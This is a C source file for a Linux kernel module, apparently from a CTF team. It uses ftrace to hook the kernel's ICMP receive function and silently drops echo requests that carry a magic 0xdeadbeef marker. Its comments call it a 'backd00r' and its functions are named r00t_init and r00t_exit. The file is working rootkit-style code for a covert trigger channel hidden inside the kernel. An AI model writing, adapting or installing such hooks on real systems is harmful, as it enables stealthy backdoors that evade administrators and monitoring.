#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <net/icmp.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("saarsec");
MODULE_DESCRIPTION("???");
MODULE_VERSION("1.0");


static int (*icmp_rcv_orig)(struct sk_buff *) = 0;

static int hook_icmp_rcv(struct sk_buff *skb) {
	struct icmphdr *icmph;
	int code;
	struct rtable *rt = skb_rtable(skb);
	// skb_checksum_simple_validate(skb);

	if (!(rt->rt_flags & (RTCF_BROADCAST | RTCF_MULTICAST))) {
		if (skb->len >= sizeof(*icmph) + 2*sizeof(int)) {
			icmph = (struct icmphdr *) skb->data;
			code = *(int *) (skb->data + sizeof(struct icmphdr));
			/*if (icmph->type == ICMP_ECHO) {
				pr_info("echo request? code=%08x\n", code);
			}*/
			if (icmph->type == ICMP_ECHO && code == 0xdeadbeef) {
				// pr_info("echo request caught (with %ld bytes of data)!\n", skb->len - sizeof(*icmph) - sizeof(int));
				if (!skb_checksum_simple_validate(skb)) {
					// pr_info("echo request is valid (and should not have kernel-generated response!)\n");
					pskb_pull(skb, sizeof(*icmph));
					kfree_skb(skb);
					return NET_RX_DROP;
				} else {
					// pr_info("echo request is checksum-invalid\n");
				}
			}
		}
	}

	return icmp_rcv_orig(skb);
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs) {
	if (!within_module(parent_ip, THIS_MODULE)) {
		if (!icmp_rcv_orig) {
			icmp_rcv_orig = (void*) regs->ip;
			// printk(KERN_INFO "icmp_rcv = %p\n", icmp_rcv_orig);
		}
		regs->ip = (uintptr_t) &hook_icmp_rcv;
	}
}

static struct ftrace_ops ftrace_op;

static int install_hook(void) {
	int err;
	ftrace_op.func = fh_ftrace_thunk;
	ftrace_op.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter(&ftrace_op, (unsigned char*) "icmp_rcv", strlen("icmp_rcv"), 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}
	err = register_ftrace_function(&ftrace_op);
	if (err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&ftrace_op, (uintptr_t) & hook_icmp_rcv, 1, 0);
		return err;
	}
	return 0;
}

static void uninstall_hook(void) {
	int err;

	err = unregister_ftrace_function(&ftrace_op);
	if (err) {
		pr_debug("unregister_ftrace_function() failed: %d\n", err);
	}
	err = ftrace_set_filter(&ftrace_op, NULL, 0, 1);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
	}
}

static int __init r00t_init(void) {
	// printk(KERN_INFO "backd00r loaded!\n");

	install_hook();

	return 0;
}

static void __exit r00t_exit(void) {
	uninstall_hook();
	// printk(KERN_INFO "backd00r removed!\n");
}

module_init(r00t_init);
module_exit(r00t_exit);
